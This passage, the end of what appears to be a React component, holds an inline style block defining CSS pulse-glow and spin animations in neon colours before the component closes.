          50% { box-shadow: 0 0 48px #00fff799, 0 0 16px #39ff1499; }
        }
        .animate-pulse-fast {
          animation: pulse-fast 1.1s cubic-bezier(0.4,0,0.6,1) infinite;
        }
        @keyframes pulse-fast {
          0%, 100% { box-shadow: 0 0 12px #39ff1444; }
          50% { box-shadow: 0 0 32px #39ff14cc; }
        }
        .animate-spin-slow {
          animation: spin 1.5s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
} 